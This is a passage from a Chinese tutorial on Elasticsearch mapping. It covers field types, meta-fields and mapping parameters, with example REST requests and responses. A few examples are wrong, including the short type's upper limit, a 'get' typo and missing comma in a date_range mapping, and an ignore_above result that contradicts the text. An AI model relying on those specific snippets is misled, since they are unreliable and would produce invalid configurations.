integer -2^31至2^31-1 short -32,768至32768 byte -128至127 double 64位双精度IEEE 754浮点类型 float 32位单精度IEEE 754浮点类型 half_float 16位半精度IEEE 754浮点类型 scaled_float 缩放类型的的浮点数（比如价格只需要精确到分，price为57.34的字段缩放因子为100，存起来就是5734） 对于float、half_float和scaled_float,-0.0和+0.0是不同的值，使用term查询查找-0.0不会匹配+0.0，同样range查询中上边界是-0.0不会匹配+0.0，下边界是+0.0不会匹配-0.0。 对于数字类型的数据，选择以上数据类型的注意事项： 在满足需求的情况下，尽可能选择范围小的数据类型。比如，某个字段的取值最大值不会超过100，那么选择byte类型即可。迄今为止吉尼斯记录的人类的年龄的最大值为134岁，对于年龄字段，short足矣。字段的长度越短，索引和搜索的效率越高。 优先考虑使用带缩放因子的浮点类型。 范例： 12345678910111213141516171819PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"number_of_bytes\": &#123; \"type\": \"integer\" &#125;, \"time_in_seconds\": &#123; \"type\": \"float\" &#125;, \"price\": &#123; \"type\": \"scaled_float\", \"scaling_factor\": 100 &#125; &#125; &#125; &#125;&#125; 0x4.1.3 Object类型JSON天生具有层级关系，文档会包含嵌套的对象： 1234567891011PUT my_index/my_type/1&#123; \"region\": \"US\", \"manager\": &#123; \"age\": 30, \"name\": &#123; \"first\": \"John\", \"last\": \"Smith\" &#125; &#125;&#125; 上面的文档中，整体是一个JSON，JSON中包含一个manager,manager又包含一个name。最终，文档会被索引成一平的key-value对： 123456&#123; \"region\": \"US\", \"manager.age\": 30, \"manager.name.first\": \"John\", \"manager.name.last\": \"Smith\"&#125; 上面文档结构的Mapping如下： 1234567891011121314151617181920212223PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"region\": &#123; \"type\": \"keyword\" &#125;, \"manager\": &#123; \"properties\": &#123; \"age\": &#123; \"type\": \"integer\" &#125;, \"name\": &#123; \"properties\": &#123; \"first\": &#123; \"type\": \"text\" &#125;, \"last\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125; 0x4.1.4date类型JSON中没有日期类型，所以在ELasticsearch中，日期类型可以是以下几种： 日期格式的字符串：“2018-01-01” or “2018/01/01 12:10:30”. long类型的毫秒数( milliseconds-since-the-epoch) integer的秒数(seconds-since-the-epoch) 日期格式可以自定义，如果没有自定义，默认格式如下： 1\"strict_date_optional_time||epoch_millis\" 范例1: 1234567891011121314PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"publication_date\": &#123; \"type\": \"date\", \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\" &#125; &#125; &#125; &#125;&#125; 范例2： 1234567891011121314151617181920212223242526PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"date\": &#123; \"type\": \"date\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"date\": \"2015-01-01\" &#125; PUT my_index/my_type/2&#123; \"date\": \"2015-01-01T12:10:30Z\" &#125; PUT my_index/my_type/3&#123; \"date\": 1420070400001 &#125; GET my_index/_search&#123; \"sort\": &#123; \"date\": \"asc\"&#125; &#125; 查看三个日期类型： 123456789101112131415161718192021222324252627282930313233343536373839404142&#123; \"took\": 0, \"timed_out\": false, \"_shards\": &#123; \"total\": 5, \"successful\": 5, \"failed\": 0 &#125;, \"hits\": &#123; \"total\": 3, \"max_score\": 1, \"hits\": [ &#123; \"_index\": \"my_index\", \"_type\": \"my_type\", \"_id\": \"2\", \"_score\": 1, \"_source\": &#123; \"date\": \"2015-01-01T12:10:30Z\" &#125; &#125;, &#123; \"_index\": \"my_index\", \"_type\": \"my_type\", \"_id\": \"1\", \"_score\": 1, \"_source\": &#123; \"date\": \"2015-01-01\" &#125; &#125;, &#123; \"_index\": \"my_index\", \"_type\": \"my_type\", \"_id\": \"3\", \"_score\": 1, \"_source\": &#123; \"date\": 1420070400001 &#125; &#125; ] &#125;&#125; 0x4.1.5Array类型ELasticsearch没有专用的数组类型，默认情况下任何字段都可以包含一个或者多个值，但是一个数组中的值要是同一种类型。例如： 字符数组: [ “one”, “two” ] 整型数组：[1,3] 嵌套数组：[1,[2,3]],等价于[1,2,3] 对象数组：[ { “name”: “Mary”, “age”: 12 }, { “name”: “John”, “age”: 10 }] 注意事项： 动态添加数据时，数组的第一个值的类型决定整个数组的类型 混合数组类型是不支持的，比如：[1,”abc”] 数组可以包含null值，空数组[ ]会被当做missing field对待。 0x4.1.6布尔型boolean逻辑类型（布尔类型）可以接受true/false/”true”/”false”值 12345678910PUT test&#123; \"mappings\":&#123; \"my\":&#123; \"properties\": &#123; \"empty\":&#123;\"type\":\"boolean\"&#125; &#125; &#125; &#125;&#125; 一般范围类型，除了type属性外，还要有gte和lte两个附加参数0x4.1.7binary类型binary类型接受base64编码的字符串，默认不存储也不可搜索。0x4.1.8ip类型ip类型的字段用于存储IPV4或者IPV6的地址 1234567891011121314151617181920212223242526PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"ip_addr\": &#123; \"type\": \"ip\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"ip_addr\": \"192.168.1.1\"&#125; GET my_index/_search&#123; \"query\": &#123; \"term\": &#123; \"ip_addr\": \"192.168.0.0/16\" &#125; &#125;&#125; 0x4.1.9range类型一般范围类型，除了type属性外，还要有gte和lte两个附加参数 (1)数字范围 integer_range long_range float_range double_range 1234567891011121314PUT user&#123; \"mappings\": &#123; \"_doc\": &#123; \"properties\": &#123; \"status\": &#123; \"type\": \"integer_range\", \"gte\": 0, \"lte\":6 &#125; &#125; &#125; &#125;&#125; (2)日期范围date_range日期范围类型，可以附加一个format参数 123456789101112131415PUT user&#123; \"mappings\": &#123; \"_doc\": &#123; \"properties\": &#123; \"create_time\": &#123; \"type\": \"date_range\", \"format\": \"yyyy-MM-dd HH:mm:ss\" \"get\":\"2019-03-30 10:00:00\", \"lte\":\"2090-03-30 10:00:00\" &#125; &#125; &#125; &#125;&#125; range类型的使用场景：比如前端的时间选择表单、年龄范围选择表单等。范例： 12345678910111213141516171819202122232425262728PUT range_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"expected_attendees\": &#123; \"type\": \"integer_range\" &#125;, \"time_frame\": &#123; \"type\": \"date_range\", \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\" &#125; &#125; &#125; &#125;&#125; PUT range_index/my_type/1&#123; \"expected_attendees\" : &#123; \"gte\" : 10, \"lte\" : 20 &#125;, \"time_frame\" : &#123; \"gte\" : \"2015-10-31 12:00:00\", \"lte\" : \"2015-11-01\" &#125;&#125; 上面代码创建了一个range_index索引，expected_attendees的人数为10到20，时间是2015-10-31 12:00:00至2015-11-01。 查询： 123456789101112POST range_index/_search&#123; \"query\" : &#123; \"range\" : &#123; \"time_frame\" : &#123; \"gte\" : \"2015-08-01\", \"lte\" : \"2015-12-01\", \"relation\" : \"within\" &#125; &#125; &#125;&#125; 查询结果： 12345678910111213141516171819202122232425262728293031&#123; \"took\": 2, \"timed_out\": false, \"_shards\": &#123; \"total\": 5, \"successful\": 5, \"failed\": 0 &#125;, \"hits\": &#123; \"total\": 1, \"max_score\": 1, \"hits\": [ &#123; \"_index\": \"range_index\", \"_type\": \"my_type\", \"_id\": \"1\", \"_score\": 1, \"_source\": &#123; \"expected_attendees\": &#123; \"gte\": 10, \"lte\": 20 &#125;, \"time_frame\": &#123; \"gte\": \"2015-10-31 12:00:00\", \"lte\": \"2015-11-01\" &#125; &#125; &#125; ] &#125;&#125; 0x4.1.10nested类型nested嵌套类型是object中的一个特例，可以让array类型的Object独立索引和查询。 使用Object类型有时会出现问题，比如文档 my_index/my_type/1的结构如下 1234567891011121314PUT my_index/my_type/1&#123; \"group\" : \"fans\", \"user\" : [ &#123; \"first\" : \"John\", \"last\" : \"Smith\" &#125;, &#123; \"first\" : \"Alice\", \"last\" : \"White\" &#125; ]&#125; user字段会被动态添加为Object类型。最后会被转换为以下平整的形式： 123456&#123; \"group\" : \"fans\", \"user.first\" : [ \"alice\", \"john\" ], \"user.last\" : [ \"smith\", \"white\" ]&#125; user.first和user.last会被平铺为多值字段，Alice和White之间的关联关系会消失。上面的文档会不正确的匹配以下查询(虽然能搜索到,实际上不存在Alice Smith)： 1234567891011GET my_index/_search&#123; \"query\": &#123; \"bool\": &#123; \"must\": [ &#123; \"match\": &#123; \"user.first\": \"Alice\" &#125;&#125;, &#123; \"match\": &#123; \"user.last\": \"Smith\" &#125;&#125; ] &#125; &#125;&#125; 使用nested字段类型解决Object类型的不足： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"user\": &#123; \"type\": \"nested\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"group\" : \"fans\", \"user\" : [ &#123; \"first\" : \"John\", \"last\" : \"Smith\" &#125;, &#123; \"first\" : \"Alice\", \"last\" : \"White\" &#125; ]&#125; GET my_index/_search&#123; \"query\": &#123; \"nested\": &#123; \"path\": \"user\", \"query\": &#123; \"bool\": &#123; \"must\": [ &#123; \"match\": &#123; \"user.first\": \"Alice\" &#125;&#125;, &#123; \"match\": &#123; \"user.last\": \"Smith\" &#125;&#125; ] &#125; &#125; &#125; &#125;&#125; GET my_index/_search&#123; \"query\": &#123; \"nested\": &#123; \"path\": \"user\", \"query\": &#123; \"bool\": &#123; \"must\": [ &#123; \"match\": &#123; \"user.first\": \"Alice\" &#125;&#125;, &#123; \"match\": &#123; \"user.last\": \"White\" &#125;&#125; ] &#125; &#125;, \"inner_hits\": &#123; \"highlight\": &#123; \"fields\": &#123; \"user.first\": &#123;&#125; &#125; &#125; &#125; &#125; &#125;&#125; 0x4.1.11token_count类型token_count用于统计词频： 123456789101112131415161718192021222324252627282930313233PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"name\": &#123; \"type\": \"text\", \"fields\": &#123; \"length\": &#123; \"type\": \"token_count\", \"analyzer\": \"standard\" &#125; &#125; &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"name\": \"John Smith\" &#125; PUT my_index/my_type/2&#123; \"name\": \"Rachel Alice Williams\" &#125; GET my_index/_search&#123; \"query\": &#123; \"term\": &#123; \"name.length\": 3 &#125; &#125;&#125; 0x4.1.12geo point理位置信息类型用于存储地理位置信息的经纬度： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"location\": &#123; \"type\": \"geo_point\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"text\": \"Geo-point as an object\", \"location\": &#123; \"lat\": 41.12, \"lon\": -71.34 &#125;&#125; PUT my_index/my_type/2&#123; \"text\": \"Geo-point as a string\", \"location\": \"41.12,-71.34\" &#125; PUT my_index/my_type/3&#123; \"text\": \"Geo-point as a geohash\", \"location\": \"drm3btev3e86\" &#125; PUT my_index/my_type/4&#123; \"text\": \"Geo-point as an array\", \"location\": [ -71.34, 41.12 ] &#125; GET my_index/_search&#123; \"query\": &#123; \"geo_bounding_box\": &#123; \"location\": &#123; \"top_left\": &#123; \"lat\": 42, \"lon\": -72 &#125;, \"bottom_right\": &#123; \"lat\": 40, \"lon\": -74 &#125; &#125; &#125; &#125;&#125; 0x4.2Meta-Fields(元数据)0x4.2.1_all_all字段是把其它字段拼接在一起的超级字段，所有的字段用空格分开，_all字段会被解析和索引，但是不存储。当你只想返回包含某个关键字的文档但是不明确地搜某个字段的时候就需要使用_all字段。例子： 123456PUT my_index/blog/1 &#123; \"title\": \"Master Java\", \"content\": \"learn java\", \"author\": \"Tom\"&#125; _all字段包含:[ “Master”, “Java”, “learn”, “Tom” ] 搜索： 12345678GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"_all\": \"Java\" &#125; &#125;&#125; 返回结果： 1234567891011121314151617181920212223242526&#123; \"took\": 1, \"timed_out\": false, \"_shards\": &#123; \"total\": 5, \"successful\": 5, \"failed\": 0 &#125;, \"hits\": &#123; \"total\": 1, \"max_score\": 0.39063013, \"hits\": [ &#123; \"_index\": \"my_index\", \"_type\": \"blog\", \"_id\": \"1\", \"_score\": 0.39063013, \"_source\": &#123; \"title\": \"Master Java\", \"content\": \"learn java\", \"author\": \"Tom\" &#125; &#125; ] &#125;&#125; 使用copy_to自定义_all字段： 123456789101112131415161718192021222324252627282930313233343536PUT myindex&#123; \"mappings\": &#123; \"mytype\": &#123; \"properties\": &#123; \"title\": &#123; \"type\": \"text\", \"copy_to\": \"full_content\" &#125;, \"content\": &#123; \"type\": \"text\", \"copy_to\": \"full_content\" &#125;, \"full_content\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125;&#125; PUT myindex/mytype/1&#123; \"title\": \"Master Java\", \"content\": \"learn Java\"&#125; GET myindex/_search&#123; \"query\": &#123; \"match\": &#123; \"full_content\": \"java\" &#125; &#125;&#125; 0x4.2.2_field_names _field_names字段用来存储文档中的所有非空字段的名字，这个字段常用于exists查询。例子如下: 12345678910111213141516171819PUT my_index/my_type/1&#123; \"title\": \"This is a document\"&#125; PUT my_index/my_type/2?refresh=true&#123; \"title\": \"This is another document\", \"body\": \"This document has a body\"&#125; GET my_index/_search&#123; \"query\": &#123; \"terms\": &#123; \"_field_names\": [ \"body\" ] &#125; &#125;&#125; 结果会返回第二条文档，因为第一条文档没有body字段。同样，可以使用exists查询： 123456GET my_index/_search&#123; \"query\": &#123; \"exists\" : &#123; \"field\" : \"body\" &#125; &#125;&#125; 0x4.2.3_id每条被索引的文档都有一个_type和_id字段，_id可以用于term查询、temrs查询、match查询、query_string查询、simple_query_string查询，但是不能用于聚合、脚本和排序。例子如下： 123456789101112131415161718PUT my_index/my_type/1&#123; \"text\": \"Document with ID 1\"&#125; PUT my_index/my_type/2&#123; \"text\": \"Document with ID 2\"&#125; GET my_index/_search&#123; \"query\": &#123; \"terms\": &#123; \"_id\": [ \"1\", \"2\" ] &#125; &#125;&#125; 0x4.2.4_index多索引查询时，有时候只需要在特地索引名上进行查询，_index字段提供了便利，也就是说可以对索引名进行term查询、terms查询、聚合分析、使用脚本和排序。 _index是一个虚拟字段，不会真的加到Lucene索引中，对_index进行term、terms查询(也包括match、query_string、simple_query_string)，但是不支持prefix、wildcard、regexp和fuzzy查询。 举例，2个索引2条文档 123456789PUT index_1/my_type/1&#123; \"text\": \"Document in index 1\"&#125; PUT index_2/my_type/2&#123; \"text\": \"Document in index 2\"&#125; 对索引名做查询、聚合、排序并使用脚本新增字段： 12345678910111213141516171819202122232425262728293031GET index_1,index_2/_search&#123; \"query\": &#123; \"terms\": &#123; \"_index\": [\"index_1\", \"index_2\"] &#125; &#125;, \"aggs\": &#123; \"indices\": &#123; \"terms\": &#123; \"field\": \"_index\", \"size\": 10 &#125; &#125; &#125;, \"sort\": [ &#123; \"_index\": &#123; \"order\": \"asc\" &#125; &#125; ], \"script_fields\": &#123; \"index_name\": &#123; \"script\": &#123; \"lang\": \"painless\", \"inline\": \"doc['_index']\" &#125; &#125; &#125;&#125; 0x4.2.5_parent_parent用于指定同一索引中文档的父子关系。下面例子中现在mapping中指定文档的父子关系，然后索引父文档，索引子文档时指定父id，最后根据子文档查询父文档。 123456789101112131415161718192021222324252627282930313233343536373839404142PUT my_index&#123; \"mappings\": &#123; \"my_parent\": &#123;&#125;, \"my_child\": &#123; \"_parent\": &#123; \"type\": \"my_parent\" &#125; &#125; &#125;&#125; PUT my_index/my_parent/1 &#123; \"text\": \"This is a parent document\"&#125; PUT my_index/my_child/2?parent=1 &#123; \"text\": \"This is a child document\"&#125; PUT my_index/my_child/3?parent=1&amp;refresh=true &#123; \"text\": \"This is another child document\"&#125; GET my_index/my_parent/_search&#123; \"query\": &#123; \"has_child\": &#123; \"type\": \"my_child\", \"query\": &#123; \"match\": &#123; \"text\": \"child document\" &#125; &#125; &#125; &#125;&#125; 0x4.2.6_routing路由参数，ELasticsearch通过以下公式计算文档应该分到哪个分片上： 1shard_num = hash(_routing) % num_primary_shards 默认的_routing值是文档的_id或者_parent，通过_routing参数可以设置自定义路由。例如，想把user1发布的博客存储到同一个分片上，索引时指定routing参数，查询时在指定路由上查询： 123456PUT my_index/my_type/1?routing=user1&amp;refresh=true &#123; \"title\": \"This is a document\"&#125; GET my_index/my_type/1?routing=user1 在查询的时候通过routing参数查询： 1234567891011121314151617GET my_index/_search&#123; \"query\": &#123; \"terms\": &#123; \"_routing\": [ \"user1\" ] &#125; &#125;&#125; GET my_index/_search?routing=user1,user2 &#123; \"query\": &#123; \"match\": &#123; \"title\": \"document\" &#125; &#125;&#125; 在Mapping中指定routing为必须的： 12345678910111213141516PUT my_index2&#123; \"mappings\": &#123; \"my_type\": &#123; \"_routing\": &#123; \"required\": true &#125; &#125; &#125;&#125; PUT my_index2/my_type/1 &#123; \"text\": \"No routing value provided\"&#125; 0x4.2.7 _source _source存储的文档的原始值。默认_source字段是开启的，也可以关闭： 12345678910PUT tweets&#123; \"mappings\": &#123; \"tweet\": &#123; \"_source\": &#123; \"enabled\": false &#125; &#125; &#125;&#125; 但是一般情况下不要关闭，除法你不想做一些操作： 使用update、update_by_query、reindex 使用高亮 数据备份、改变mapping、升级索引 通过原始字段debug查询或者聚合 0x4.3Mapping参数0x4.3.1analyzer指定分词器(分析器更合理)，对索引和查询都有效。如下，指定ik分词的配置： 123456789101112131415PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"content\": &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\" &#125; &#125; &#125; &#125;&#125; 0x4.3.2normalizernormalizer用于解析前的标准化配置，比如把所有的字符转化为小写等。例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PUT index&#123; \"settings\": &#123; \"analysis\": &#123; \"normalizer\": &#123; \"my_normalizer\": &#123; \"type\": \"custom\", \"char_filter\": [], \"filter\": [\"lowercase\", \"asciifolding\"] &#125; &#125; &#125; &#125;, \"mappings\": &#123; \"type\": &#123; \"properties\": &#123; \"foo\": &#123; \"type\": \"keyword\", \"normalizer\": \"my_normalizer\" &#125; &#125; &#125; &#125;&#125; PUT index/type/1&#123; \"foo\": \"BÀR\"&#125; PUT index/type/2&#123; \"foo\": \"bar\"&#125; PUT index/type/3&#123; \"foo\": \"baz\"&#125; POST index/_refresh GET index/_search&#123; \"query\": &#123; \"match\": &#123; \"foo\": \"BAR\" &#125; &#125;&#125; BÀR经过normalizer过滤以后转换为bar，文档1和文档2会被搜索到。 0x4.3.3boostboost字段用于设置字段的权重，比如，关键字出现在title字段的权重是出现在content字段中权重的2倍，设置mapping如下，其中content字段的默认权重是1. 12345678910111213141516PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"title\": &#123; \"type\": \"text\", \"boost\": 2 &#125;, \"content\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125;&#125; 同样，在查询时指定权重也是一样的： 1234567891011POST _search&#123; \"query\": &#123; \"match\" : &#123; \"title\": &#123; \"query\": \"quick brown fox\", \"boost\": 2 &#125; &#125; &#125;&#125; 0x4.3.4coercecoerce属性用于清除脏数据，coerce的默认值是true。整型数字5有可能会被写成字符串“5”或者浮点数5.0.coerce属性可以用来清除脏数据： 字符串会被强制转换为整数浮点数被强制转换为整数 1234567891011121314151617181920212223242526PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"number_one\": &#123; \"type\": \"integer\" &#125;, \"number_two\": &#123; \"type\": \"integer\", \"coerce\": false &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"number_one\": \"10\" &#125; PUT my_index/my_type/2&#123; \"number_two\": \"10\" &#125; mapping中指定number_one字段是integer类型，虽然插入的数据类型是String，但依然可以插入成功。number_two字段关闭了coerce，因此插入失败。 0x4.3.5copy_tocopy_to属性用于配置自定义的_all字段。换言之，就是多个字段可以合并成一个超级字段。比如，first_name和last_name可以合并为full_name字段。 1234567891011121314151617181920212223242526272829303132333435363738PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"first_name\": &#123; \"type\": \"text\", \"copy_to\": \"full_name\" &#125;, \"last_name\": &#123; \"type\": \"text\", \"copy_to\": \"full_name\" &#125;, \"full_name\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"first_name\": \"John\", \"last_name\": \"Smith\"&#125; GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"full_name\": &#123; \"query\": \"John Smith\", \"operator\": \"and\" &#125; &#125; &#125;&#125; 0x4.3.6doc_valuesdoc_values是为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 12345678910111213141516PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"status_code\": &#123; \"type\": \"keyword\" &#125;, \"session_id\": &#123; \"type\": \"keyword\", \"doc_values\": false &#125; &#125; &#125; &#125;&#125; 0x4.3.7dynamicdynamic属性用于检测新发现的字段，有三个取值： true:新发现的字段添加到映射中。（默认） flase:新检测的字段被忽略。必须显式添加新字段。 strict:如果检测到新字段，就会引发异常并拒绝文档。 例子： 12345678910111213141516171819202122PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"dynamic\": false, \"properties\": &#123; \"user\": &#123; \"properties\": &#123; \"name\": &#123; \"type\": \"text\" &#125;, \"social_networks\": &#123; \"dynamic\": true, \"properties\": &#123;&#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125; PS：取值为strict，非布尔值要加引号0x4.3.8enabledELasticseaech默认会索引所有的字段，enabled设为false的字段，es会跳过字段内容，该字段只能从_source中获取，但是不可搜。而且字段可以是任意类型。 123456789101112131415161718192021222324252627282930313233343536PUT my_index&#123; \"mappings\": &#123; \"session\": &#123; \"properties\": &#123; \"user_id\": &#123; \"type\": \"keyword\" &#125;, \"last_updated\": &#123; \"type\": \"date\" &#125;, \"session_data\": &#123; \"enabled\": false &#125; &#125; &#125; &#125;&#125; PUT my_index/session/session_1&#123; \"user_id\": \"kimchy\", \"session_data\": &#123; \"arbitrary_object\": &#123; \"some_array\": [ \"foo\", \"bar\", &#123; \"baz\": 2 &#125; ] &#125; &#125;, \"last_updated\": \"2015-12-06T18:20:22\"&#125; PUT my_index/session/session_2&#123; \"user_id\": \"jpountz\", \"session_data\": \"none\", \"last_updated\": \"2015-12-06T18:22:13\"&#125; 0x4.3.9fielddata搜索要解决的问题是“包含查询关键词的文档有哪些？”，聚合恰恰相反，聚合要解决的问题是“文档包含哪些词项”，大多数字段再索引时生成doc_values，但是text字段不支持doc_values。 取而代之，text字段在查询时会生成一个fielddata的数据结构，fielddata在字段首次被聚合、排序、或者使用脚本的时候生成。ELasticsearch通过读取磁盘上的倒排记录表重新生成文档词项关系，最后在Java堆内存中排序。 text字段的fielddata属性默认是关闭的，开启fielddata非常消耗内存。在你开启text字段以前，想清楚为什么要在text类型的字段上做聚合、排序操作。大多数情况下这么做是没有意义的。 “New York”会被分析成“new”和“york”，在text类型上聚合会分成“new”和“york”2个桶，也许你需要的是一个“New York”。这是可以加一个不分析的keyword字段： 1234567891011121314151617PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"my_field\": &#123; \"type\": \"text\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\" &#125; &#125; &#125; &#125; &#125; &#125;&#125; 面的mapping中实现了通过my_field字段做全文搜索，my_field.keyword做聚合、排序和使用脚本。0x4.3.10 ignore_aboveignore_above用于指定字段索引和存储的长度最大值，超过最大值的会被忽略： 1234567891011121314151617181920212223242526272829303132333435PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"message\": &#123; \"type\": \"keyword\", \"ignore_above\": 15 &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1 &#123; \"message\": \"Syntax error\"&#125; PUT my_index/my_type/2 &#123; \"message\": \"Syntax error with some long stacktrace\"&#125; GET my_index/_search &#123; \"size\": 0, \"aggs\": &#123; \"messages\": &#123; \"terms\": &#123; \"field\": \"message\" &#125; &#125; &#125;&#125; mapping中指定了ignore_above字段的最大长度为15，第一个文档的字段长小于15，因此索引成功，第二个超过15，因此不索引，返回结果只有”Syntax error”,结果如下： 123456789101112131415161718192021&#123; \"took\": 2, \"timed_out\": false, \"_shards\": &#123; \"total\": 5, \"successful\": 5, \"failed\": 0 &#125;, \"hits\": &#123; \"total\": 2, \"max_score\": 0, \"hits\": [] &#125;, \"aggregations\": &#123; \"messages\": &#123; \"doc_count_error_upper_bound\": 0, \"sum_other_doc_count\": 0, \"buckets\": [] &#125; &#125;&#125; 0x4.3.11ignore_malformedignore_malformed可以忽略不规则数据，对于login字段，有人可能填写的是date类型，也有人填写的是邮件格式。给一个字段索引不合适的数据类型发生异常，导致整个文档索引失败。如果ignore_malformed参数设为true，异常会被忽略，出异常的字段不会被索引，其它字段正常索引。 12345678910111213141516171819202122232425262728PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"number_one\": &#123; \"type\": \"integer\", \"ignore_malformed\": true &#125;, \"number_two\": &#123; \"type\": \"integer\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"text\": \"Some text value\", \"number_one\": \"foo\" &#125; PUT my_index/my_type/2&#123; \"text\": \"Some text value\", \"number_two\": \"foo\" &#125; 上面的例子中number_one接受integer类型，ignore_malformed属性设为true，因此文档一种number_one字段虽然是字符串但依然能写入成功；number_two接受integer类型，默认ignore_malformed属性为false，因此写入失败。 0x4.3.12formatformat属性主要用于格式化日期： 12345678910111213PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"date\": &#123; \"type\": \"date\", \"format\": \"yyyy-MM-dd\" &#125; &#125; &#125; &#125;&#125; 0x4.3.13include_in_allinclude_in_all属性用于指定字段是否包含在_all字段里面，默认开启，除索引时index属性为no。例子如下，title和content字段包含在_all字段里，date不包含。 12345678910111213141516171819PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"title\": &#123; \"type\": \"text\" &#125;, \"content\": &#123; \"type\": \"text\" &#125;, \"date\": &#123; \"type\": \"date\", \"include_in_all\": false &#125; &#125; &#125; &#125;&#125; include_in_all也可用于字段级别，如下my_type下的所有字段都排除在_all字段之外，author.first_name 和author.last_name 包含在in _all中： 123456789101112131415161718192021222324PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"include_in_all\": false, \"properties\": &#123; \"title\": &#123; \"type\": \"text\" &#125;, \"author\": &#123; \"include_in_all\": true, \"properties\": &#123; \"first_name\": &#123; \"type\": \"text\" &#125;, \"last_name\": &#123; \"type\": \"text\" &#125; &#125; &#125;, \"editor\": &#123; \"properties\": &#123; \"first_name\": &#123; \"type\": \"text\" &#125;, \"last_name\": &#123; \"type\": \"text\", \"include_in_all\": true &#125; &#125; &#125; &#125; &#125; &#125;&#125; 0x4.3.14indexindex属性指定字段是否索引，不索引也就不可搜索，取值可以为true或者false。 0x4.3.15index_optionsindex_options控制索引时存储哪些信息到倒排索引中，接受以下配置： 参数 作用 docs 只存储文档编号 freqs 存储文档编号和词项频率 positions 文档编号、词项频率、词项的位置被存储，偏移位置可用于临近搜索和短语查询 offsets 文档编号、词项频率、词项的位置、词项开始和结束的字符位置都被存储，offsets设为true会使用Postings highlighter 0x4.3.16 fieldsfields可以让同一文本有多种不同的索引方式，比如一个String类型的字段，可以使用text类型做全文检索，使用keyword类型做聚合和排序。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"city\": &#123; \"type\": \"text\", \"fields\": &#123; \"raw\": &#123; \"type\": \"keyword\" &#125; &#125; &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"city\": \"New York\"&#125; PUT my_index/my_type/2&#123; \"city\": \"York\"&#125; GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"city\": \"york\" &#125; &#125;, \"sort\": &#123; \"city.raw\": \"asc\" &#125;, \"aggs\": &#123; \"Cities\": &#123; \"terms\": &#123; \"field\": \"city.raw\" &#125; &#125; &#125;&#125;**0x4.3.17 norms**norms参数用于标准化文档，以便查询时计算文档的相关性。norms虽然对评分有用，但是会消耗较多的磁盘空间，如果不需要对某个字段进行评分，最好不要开启norms。**0x4.3.18 null_value**值为null的字段不索引也不可以搜索，null_value参数可以让值为null的字段显式的可索引、可搜索。例子：```bashPUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"status_code\": &#123; \"type\": \"keyword\", \"null_value\": \"NULL\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"status_code\": null&#125; PUT my_index/my_type/2&#123; \"status_code\": [] &#125; GET my_index/_search&#123; \"query\": &#123; \"term\": &#123; \"status_code\": \"NULL\" &#125; &#125;&#125; 文档1可以被搜索到，因为status_code的值为null，文档2不可以被搜索到，因为status_code为空数组，但是不是null。 0x4.3.19 position_increment_gap为了支持近似或者短语查询，text字段被解析的时候会考虑此项的位置信息。举例，一个字段的值为数组类型： 1\"names\": [ \"John Abraham\", \"Lincoln Smith\"] 